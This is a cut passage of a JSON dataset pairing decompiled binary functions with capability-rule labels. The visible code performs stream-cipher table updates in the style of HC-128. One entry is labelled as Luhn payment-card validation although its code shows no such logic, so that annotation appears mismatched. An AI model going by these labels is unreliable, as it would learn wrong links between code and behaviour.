*(arg_8h + 0x1004) << 0x18) + *(arg_8h + 0x2c + uVar3 * 4);\n        *(arg_8h + 0x102c) = *(arg_8h + 0x2c + uVar3 * 4);\n        arg_ch[0xb] = iVar1 + iVar2 ^ *(arg_8h + 0x2c + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1000) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1000) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x30 + uVar3 * 4) =\n             ((*(arg_8h + 0x34 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x34 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1024) >> 10 | *(arg_8h + 0x1024) << 0x16)) +\n             (*(arg_8h + 0x1008) >> 8 | *(arg_8h + 0x1008) << 0x18) + *(arg_8h + 0x30 + uVar3 * 4);\n        *(arg_8h + 0x1030) = *(arg_8h + 0x30 + uVar3 * 4);\n        arg_ch[0xc] = iVar1 + iVar2 ^ *(arg_8h + 0x30 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1004) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1004) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x34 + uVar3 * 4) =\n             ((*(arg_8h + 0x38 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x38 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1028) >> 10 | *(arg_8h + 0x1028) << 0x16)) +\n             (*(arg_8h + 0x100c) >> 8 | *(arg_8h + 0x100c) << 0x18) + *(arg_8h + 0x34 + uVar3 * 4);\n        *(arg_8h + 0x1034) = *(arg_8h + 0x34 + uVar3 * 4);\n        arg_ch[0xd] = iVar1 + iVar2 ^ *(arg_8h + 0x34 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1008) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1008) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x38 + uVar3 * 4) =\n             ((*(arg_8h + 0x3c + uVar3 * 4) >> 0x17 | *(arg_8h + 0x3c + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x102c) >> 10 | *(arg_8h + 0x102c) << 0x16)) +\n             (*(arg_8h + 0x1010) >> 8 | *(arg_8h + 0x1010) << 0x18) + *(arg_8h + 0x38 + uVar3 * 4);\n        *(arg_8h + 0x1038) = *(arg_8h + 0x38 + uVar3 * 4);\n        arg_ch[0xe] = iVar1 + iVar2 ^ *(arg_8h + 0x38 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x100c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x100c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x3c + uVar3 * 4) =\n             ((*(arg_8h + uVar4 * 4) >> 0x17 | *(arg_8h + uVar4 * 4) << 9) ^\n             (*(arg_8h + 0x1030) >> 10 | *(arg_8h + 0x1030) << 0x16)) +\n             (*(arg_8h + 0x1014) >> 8 | *(arg_8h + 0x1014) << 0x18) + *(arg_8h + 0x3c + uVar3 * 4);\n        *(arg_8h + 0x103c) = *(arg_8h + 0x3c + uVar3 * 4);\n        arg_ch[0xf] = iVar1 + iVar2 ^ *(arg_8h + 0x3c + uVar3 * 4);\n    }\n    else {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        iVar1 = *(arg_8h + *(arg_8h + 0x1050) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1050) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x800 + uVar3 * 4) =\n             ((*(arg_8h + 0x804 + uVar3 * 4) >> 9 | *(arg_8h + 0x804 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1074) >> 0x16 | *(arg_8h + 0x1074) << 10)) +\n             (*(arg_8h + 0x1058) >> 0x18 | *(arg_8h + 0x1058) << 8) + *(arg_8h + 0x800 + uVar3 * 4);\n        *(arg_8h + 0x1040) = *(arg_8h + 0x800 + uVar3 * 4);\n        *arg_ch = iVar1 + iVar2 ^ *(arg_8h + 0x800 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1054) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1054) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x804 + uVar3 * 4) =\n             ((*(arg_8h + 0x808 + uVar3 * 4) >> 9 | *(arg_8h + 0x808 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1078) >> 0x16 | *(arg_8h + 0x1078) << 10)) +\n             (*(arg_8h + 0x105c) >> 0x18 | *(arg_8h + 0x105c) << 8) + *(arg_8h + 0x804 + uVar3 * 4);\n        *(arg_8h + 0x1044) = *(arg_8h + 0x804 + uVar3 * 4);\n        arg_ch[1] = iVar1 + iVar2 ^ *(arg_8h + 0x804 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1058) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1058) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x808 + uVar3 * 4) =\n             ((*(arg_8h + 0x80c + uVar3 * 4) >> 9 | *(arg_8h + 0x80c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x107c) >> 0x16 | *(arg_8h + 0x107c) << 10)) +\n             (*(arg_8h + 0x1060) >> 0x18 | *(arg_8h + 0x1060) << 8) + *(arg_8h + 0x808 + uVar3 * 4);\n        *(arg_8h + 0x1048) = *(arg_8h + 0x808 + uVar3 * 4);\n        arg_ch[2] = iVar1 + iVar2 ^ *(arg_8h + 0x808 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x105c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x105c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x80c + uVar3 * 4) =\n             ((*(arg_8h + 0x810 + uVar3 * 4) >> 9 | *(arg_8h + 0x810 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1040) >> 0x16 | *(arg_8h + 0x1040) << 10)) +\n             (*(arg_8h + 0x1064) >> 0x18 | *(arg_8h + 0x1064) << 8) + *(arg_8h + 0x80c + uVar3 * 4);\n        *(arg_8h + 0x104c) = *(arg_8h + 0x80c + uVar3 * 4);\n        arg_ch[3] = iVar1 + iVar2 ^ *(arg_8h + 0x80c + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1060) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1060) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x810 + uVar3 * 4) =\n             ((*(arg_8h + 0x814 + uVar3 * 4) >> 9 | *(arg_8h + 0x814 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1044) >> 0x16 | *(arg_8h + 0x1044) << 10)) +\n             (*(arg_8h + 0x1068) >> 0x18 | *(arg_8h + 0x1068) << 8) + *(arg_8h + 0x810 + uVar3 * 4);\n        *(arg_8h + 0x1050) = *(arg_8h + 0x810 + uVar3 * 4);\n        arg_ch[4] = iVar1 + iVar2 ^ *(arg_8h + 0x810 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1064) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1064) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x814 + uVar3 * 4) =\n             ((*(arg_8h + 0x818 + uVar3 * 4) >> 9 | *(arg_8h + 0x818 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1048) >> 0x16 | *(arg_8h + 0x1048) << 10)) +\n             (*(arg_8h + 0x106c) >> 0x18 | *(arg_8h + 0x106c) << 8) + *(arg_8h + 0x814 + uVar3 * 4);\n        *(arg_8h + 0x1054) = *(arg_8h + 0x814 + uVar3 * 4);\n        arg_ch[5] = iVar1 + iVar2 ^ *(arg_8h + 0x814 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1068) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1068) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x818 + uVar3 * 4) =\n             ((*(arg_8h + 0x81c + uVar3 * 4) >> 9 | *(arg_8h + 0x81c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x104c) >> 0x16 | *(arg_8h + 0x104c) << 10)) +\n             (*(arg_8h + 0x1070) >> 0x18 | *(arg_8h + 0x1070) << 8) + *(arg_8h + 0x818 + uVar3 * 4);\n        *(arg_8h + 0x1058) = *(arg_8h + 0x818 + uVar3 * 4);\n        arg_ch[6] = iVar1 + iVar2 ^ *(arg_8h + 0x818 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x106c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x106c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x81c + uVar3 * 4) =\n             ((*(arg_8h + 0x820 + uVar3 * 4) >> 9 | *(arg_8h + 0x820 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1050) >> 0x16 | *(arg_8h + 0x1050) << 10)) +\n             (*(arg_8h + 0x1074) >> 0x18 | *(arg_8h + 0x1074) << 8) + *(arg_8h + 0x81c + uVar3 * 4);\n        *(arg_8h + 0x105c) = *(arg_8h + 0x81c + uVar3 * 4);\n        arg_ch[7] = iVar1 + iVar2 ^ *(arg_8h + 0x81c + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1070) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1070) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x820 + uVar3 * 4) =\n             ((*(arg_8h + 0x824 + uVar3 * 4) >> 9 | *(arg_8h + 0x824 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1054) >> 0x16 | *(arg_8h + 0x1054) << 10)) +\n             (*(arg_8h + 0x1078) >> 0x18 | *(arg_8h + 0x1078) << 8) + *(arg_8h + 0x820 + uVar3 * 4);\n        *(arg_8h + 0x1060) = *(arg_8h + 0x820 + uVar3 * 4);\n        arg_ch[8] = iVar1 + iVar2 ^ *(arg_8h + 0x820 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1074) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1074) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x824 + uVar3 * 4) =\n             ((*(arg_8h + 0x828 + uVar3 * 4) >> 9 | *(arg_8h + 0x828 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1058) >> 0x16 | *(arg_8h + 0x1058) << 10)) +\n             (*(arg_8h + 0x107c) >> 0x18 | *(arg_8h + 0x107c) << 8) + *(arg_8h + 0x824 + uVar3 * 4);\n        *(arg_8h + 0x1064) = *(arg_8h + 0x824 + uVar3 * 4);\n        arg_ch[9] = iVar1 + iVar2 ^ *(arg_8h + 0x824 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1078) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1078) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x828 + uVar3 * 4) =\n             ((*(arg_8h + 0x82c + uVar3 * 4) >> 9 | *(arg_8h + 0x82c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x105c) >> 0x16 | *(arg_8h + 0x105c) << 10)) +\n             (*(arg_8h + 0x1040) >> 0x18 | *(arg_8h + 0x1040) << 8) + *(arg_8h + 0x828 + uVar3 * 4);\n        *(arg_8h + 0x1068) = *(arg_8h + 0x828 + uVar3 * 4);\n        arg_ch[10] = iVar1 + iVar2 ^ *(arg_8h + 0x828 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x107c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x107c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x82c + uVar3 * 4) =\n             ((*(arg_8h + 0x830 + uVar3 * 4) >> 9 | *(arg_8h + 0x830 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1060) >> 0x16 | *(arg_8h + 0x1060) << 10)) +\n             (*(arg_8h + 0x1044) >> 0x18 | *(arg_8h + 0x1044) << 8) + *(arg_8h + 0x82c + uVar3 * 4);\n        *(arg_8h + 0x106c) = *(arg_8h + 0x82c + uVar3 * 4);\n        arg_ch[0xb] = iVar1 + iVar2 ^ *(arg_8h + 0x82c + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1040) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1040) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x830 + uVar3 * 4) =\n             ((*(arg_8h + 0x834 + uVar3 * 4) >> 9 | *(arg_8h + 0x834 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1064) >> 0x16 | *(arg_8h + 0x1064) << 10)) +\n             (*(arg_8h + 0x1048) >> 0x18 | *(arg_8h + 0x1048) << 8) + *(arg_8h + 0x830 + uVar3 * 4);\n        *(arg_8h + 0x1070) = *(arg_8h + 0x830 + uVar3 * 4);\n        arg_ch[0xc] = iVar1 + iVar2 ^ *(arg_8h + 0x830 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1044) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1044) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x834 + uVar3 * 4) =\n             ((*(arg_8h + 0x838 + uVar3 * 4) >> 9 | *(arg_8h + 0x838 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1068) >> 0x16 | *(arg_8h + 0x1068) << 10)) +\n             (*(arg_8h + 0x104c) >> 0x18 | *(arg_8h + 0x104c) << 8) + *(arg_8h + 0x834 + uVar3 * 4);\n        *(arg_8h + 0x1074) = *(arg_8h + 0x834 + uVar3 * 4);\n        arg_ch[0xd] = iVar1 + iVar2 ^ *(arg_8h + 0x834 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1048) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1048) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x838 + uVar3 * 4) =\n             ((*(arg_8h + 0x83c + uVar3 * 4) >> 9 | *(arg_8h + 0x83c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x106c) >> 0x16 | *(arg_8h + 0x106c) << 10)) +\n             (*(arg_8h + 0x1050) >> 0x18 | *(arg_8h + 0x1050) << 8) + *(arg_8h + 0x838 + uVar3 * 4);\n        *(arg_8h + 0x1078) = *(arg_8h + 0x838 + uVar3 * 4);\n        arg_ch[0xe] = iVar1 + iVar2 ^ *(arg_8h + 0x838 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x104c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x104c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x83c + uVar3 * 4) =\n             ((*(arg_8h + 0x800 + uVar4 * 4) >> 9 | *(arg_8h + 0x800 + uVar4 * 4) << 0x17) ^\n             (*(arg_8h + 0x1070) >> 0x16 | *(arg_8h + 0x1070) << 10)) +\n             (*(arg_8h + 0x1054) >> 0x18 | *(arg_8h + 0x1054) << 8) + *(arg_8h + 0x83c + uVar3 * 4);\n        *(arg_8h + 0x107c) = *(arg_8h + 0x83c + uVar3 * 4);\n        arg_ch[0xf] = iVar1 + iVar2 ^ *(arg_8h + 0x83c + uVar3 * 4);\n    }\n    return;\n}\n",
        "token_count": 10479
    },
    "0040da20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040da20(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_24h;\n    uint var_4h;\n    \n    uVar1 = *(arg_8h + 0x1080) & 0x1ff;\n    uVar2 = uVar1 + 0x10 & 0x1ff;\n    if (*(arg_8h + 0x1080) < 0x200) {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        *(arg_8h + uVar1 * 4) =\n             *(arg_8h + uVar1 * 4) + (*(arg_8h + 0x1018) >> 8 | *(arg_8h + 0x1018) << 0x18) +\n             ((*(arg_8h + 4 + uVar1 * 4) >> 0x17 | *(arg_8h + 4 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1034) >> 10 | *(arg_8h + 0x1034) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1010) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1010) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1000) = *(arg_8h + uVar1 * 4);\n        *(arg_8h + 4 + uVar1 * 4) =\n             *(arg_8h + 4 + uVar1 * 4) + (*(arg_8h + 0x101c) >> 8 | *(arg_8h + 0x101c) << 0x18) +\n             ((*(arg_8h + 8 + uVar1 * 4) >> 0x17 | *(arg_8h + 8 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1038) >> 10 | *(arg_8h + 0x1038) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1014) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1014) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1004) = *(arg_8h + 4 + uVar1 * 4);\n        *(arg_8h + 8 + uVar1 * 4) =\n             *(arg_8h + 8 + uVar1 * 4) + (*(arg_8h + 0x1020) >> 8 | *(arg_8h + 0x1020) << 0x18) +\n             ((*(arg_8h + 0xc + uVar1 * 4) >> 0x17 | *(arg_8h + 0xc + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x103c) >> 10 | *(arg_8h + 0x103c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1018) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1018) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1008) = *(arg_8h + 8 + uVar1 * 4);\n        *(arg_8h + 0xc + uVar1 * 4) =\n             *(arg_8h + 0xc + uVar1 * 4) + (*(arg_8h + 0x1024) >> 8 | *(arg_8h + 0x1024) << 0x18) +\n             ((*(arg_8h + 0x10 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x10 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1000) >> 10 | *(arg_8h + 0x1000) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x101c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x101c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x100c) = *(arg_8h + 0xc + uVar1 * 4);\n        *(arg_8h + 0x10 + uVar1 * 4) =\n             *(arg_8h + 0x10 + uVar1 * 4) + (*(arg_8h + 0x1028) >> 8 | *(arg_8h + 0x1028) << 0x18) +\n             ((*(arg_8h + 0x14 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x14 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1004) >> 10 | *(arg_8h + 0x1004) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1020) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1020) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1010) = *(arg_8h + 0x10 + uVar1 * 4);\n        *(arg_8h + 0x14 + uVar1 * 4) =\n             *(arg_8h + 0x14 + uVar1 * 4) + (*(arg_8h + 0x102c) >> 8 | *(arg_8h + 0x102c) << 0x18) +\n             ((*(arg_8h + 0x18 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x18 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1008) >> 10 | *(arg_8h + 0x1008) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1024) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1024) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1014) = *(arg_8h + 0x14 + uVar1 * 4);\n        *(arg_8h + 0x18 + uVar1 * 4) =\n             *(arg_8h + 0x18 + uVar1 * 4) + (*(arg_8h + 0x1030) >> 8 | *(arg_8h + 0x1030) << 0x18) +\n             ((*(arg_8h + 0x1c + uVar1 * 4) >> 0x17 | *(arg_8h + 0x1c + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x100c) >> 10 | *(arg_8h + 0x100c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1028) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1028) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1018) = *(arg_8h + 0x18 + uVar1 * 4);\n        *(arg_8h + 0x1c + uVar1 * 4) =\n             *(arg_8h + 0x1c + uVar1 * 4) + (*(arg_8h + 0x1034) >> 8 | *(arg_8h + 0x1034) << 0x18) +\n             ((*(arg_8h + 0x20 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x20 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1010) >> 10 | *(arg_8h + 0x1010) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x102c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x102c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x101c) = *(arg_8h + 0x1c + uVar1 * 4);\n        *(arg_8h + 0x20 + uVar1 * 4) =\n             *(arg_8h + 0x20 + uVar1 * 4) + (*(arg_8h + 0x1038) >> 8 | *(arg_8h + 0x1038) << 0x18) +\n             ((*(arg_8h + 0x24 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x24 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1014) >> 10 | *(arg_8h + 0x1014) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1030) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1030) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1020) = *(arg_8h + 0x20 + uVar1 * 4);\n        *(arg_8h + 0x24 + uVar1 * 4) =\n             *(arg_8h + 0x24 + uVar1 * 4) + (*(arg_8h + 0x103c) >> 8 | *(arg_8h + 0x103c) << 0x18) +\n             ((*(arg_8h + 0x28 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x28 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1018) >> 10 | *(arg_8h + 0x1018) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1034) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1034) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1024) = *(arg_8h + 0x24 + uVar1 * 4);\n        *(arg_8h + 0x28 + uVar1 * 4) =\n             *(arg_8h + 0x28 + uVar1 * 4) + (*(arg_8h + 0x1000) >> 8 | *(arg_8h + 0x1000) << 0x18) +\n             ((*(arg_8h + 0x2c + uVar1 * 4) >> 0x17 | *(arg_8h + 0x2c + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x101c) >> 10 | *(arg_8h + 0x101c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1038) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1038) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1028) = *(arg_8h + 0x28 + uVar1 * 4);\n        *(arg_8h + 0x2c + uVar1 * 4) =\n             *(arg_8h + 0x2c + uVar1 * 4) + (*(arg_8h + 0x1004) >> 8 | *(arg_8h + 0x1004) << 0x18) +\n             ((*(arg_8h + 0x30 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x30 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1020) >> 10 | *(arg_8h + 0x1020) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x103c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x103c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x102c) = *(arg_8h + 0x2c + uVar1 * 4);\n        *(arg_8h + 0x30 + uVar1 * 4) =\n             *(arg_8h + 0x30 + uVar1 * 4) + (*(arg_8h + 0x1008) >> 8 | *(arg_8h + 0x1008) << 0x18) +\n             ((*(arg_8h + 0x34 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x34 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1024) >> 10 | *(arg_8h + 0x1024) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1000) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1000) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1030) = *(arg_8h + 0x30 + uVar1 * 4);\n        *(arg_8h + 0x34 + uVar1 * 4) =\n             *(arg_8h + 0x34 + uVar1 * 4) + (*(arg_8h + 0x100c) >> 8 | *(arg_8h + 0x100c) << 0x18) +\n             ((*(arg_8h + 0x38 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x38 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1028) >> 10 | *(arg_8h + 0x1028) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1004) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1004) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1034) = *(arg_8h + 0x34 + uVar1 * 4);\n        *(arg_8h + 0x38 + uVar1 * 4) =\n             *(arg_8h + 0x38 + uVar1 * 4) + (*(arg_8h + 0x1010) >> 8 | *(arg_8h + 0x1010) << 0x18) +\n             ((*(arg_8h + 0x3c + uVar1 * 4) >> 0x17 | *(arg_8h + 0x3c + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x102c) >> 10 | *(arg_8h + 0x102c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1008) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1008) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1038) = *(arg_8h + 0x38 + uVar1 * 4);\n        *(arg_8h + 0x3c + uVar1 * 4) =\n             *(arg_8h + 0x3c + uVar1 * 4) + (*(arg_8h + 0x1014) >> 8 | *(arg_8h + 0x1014) << 0x18) +\n             ((*(arg_8h + uVar2 * 4) >> 0x17 | *(arg_8h + uVar2 * 4) << 9) ^\n             (*(arg_8h + 0x1030) >> 10 | *(arg_8h + 0x1030) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x100c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x100c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x103c) = *(arg_8h + 0x3c + uVar1 * 4);\n    }\n    else {\n        